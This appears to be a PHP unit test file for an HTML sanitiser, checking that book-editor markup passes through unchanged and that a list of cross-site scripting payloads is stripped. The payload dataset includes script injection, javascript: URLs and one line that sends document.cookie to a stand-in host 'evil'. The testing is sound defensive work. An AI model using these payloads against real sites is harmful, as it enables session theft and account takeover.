<?php

use App\Services\Security\NodeHtmlSanitizer as S;

/**
 * Unit tests for the defence-in-depth write-path sanitiser.
 *
 * Two contracts:
 *   1. It must NEVER alter legitimate content (no corruption of saved work).
 *   2. It must strip every execution vector it's handed.
 */

// ---- 1. Legitimate content passes through byte-for-byte ----------------------

dataset('legit_node_content', [
    '<p id="358000" data-node-id="book_177_bo2t195dj">Luowei said stiffly: “I am fine.”</p>',
    '<p data-node-id="b6ec2428" no-delete-id="please" style="min-height:1.5em;"><a fn-count-id="40500" id="Fn1777_edfhuoiu"></a></p>',
    '<p id="161400" data-node-id="kkeemm">——. Nouveaux aspects de la théorie de l\'emploi. Paris, 1952.</p>',
    '<p id="365500" data-node-id="book_177">She left him there for<a href="#chapter-11-note-12" id="012_r"><sup>i</sup></a> the <span>Lord</span>.</p>',
    '<blockquote><em>emphasis</em> and <i>italics</i> with <sup fn-count-id="a">3</sup></blockquote>',
    '<h1 id="h">A Heading</h1><p>Plain paragraph, no markup at all.</p>',
    'just plain text, no tags',
    '<latex data-math="eA==">x</latex>',
]);

test('legitimate node content is returned unchanged', function (string $html) {
    expect(S::clean($html))->toBe($html);
})->with('legit_node_content');

test('null and empty pass through', function () {
    expect(S::clean(null))->toBeNull();
    expect(S::clean(''))->toBe('');
});

// ---- 2. Execution vectors are stripped --------------------------------------

dataset('xss_payloads', [
    '<p>hi</p><img src=x onerror="alert(1)">',
    '<script>alert(1)</script><p>x</p>',
    '<svg onload=alert(1)></svg>',
    '<a href="javascript:alert(1)">x</a>',
    '<iframe src="javascript:alert(1)"></iframe>',
    '<img src=x ONERROR=alert(1)>',
    '<a href="&#106;avascript:alert(1)">x</a>',
    '<object data="javascript:alert(1)"></object>',
    '<body onload=alert(1)>',
    '<p onclick="steal()">click</p>',
    "<img src=x onerror=\"new Image().src='//evil/'+document.cookie\">",
]);

test('xss payloads are neutralised', function (string $html) {
    $out = S::clean($html);
    expect($out)->not->toMatch('/\son[a-z]+\s*=/i');          // no event handlers
    expect($out)->not->toMatch('/<\s*(script|iframe|object)\b/i'); // no dangerous tags
    expect($out)->not->toMatch('/javascript\s*:/i');          // no js: scheme
})->with('xss_payloads');

test('benign text inside a payload survives the scrub', function () {
    $out = S::clean('<p>keep me</p><img src=x onerror="alert(1)"><p>and me</p>');
    expect($out)->toContain('keep me')->toContain('and me');
});
